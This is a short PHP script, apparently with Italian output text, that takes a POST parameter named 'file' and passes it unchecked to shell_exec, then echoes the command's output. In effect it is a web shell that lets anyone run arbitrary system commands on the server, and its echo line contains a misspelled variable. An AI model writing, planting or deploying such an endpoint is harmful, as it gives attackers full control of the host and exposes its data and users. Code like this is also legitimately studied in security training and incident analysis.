<?
	include_once('__system.php');

	$script = $_POST['file'];
	$aux = shell_exec($script);
	echo "RICEVUTO ".$scritp." - ".$aux;
?>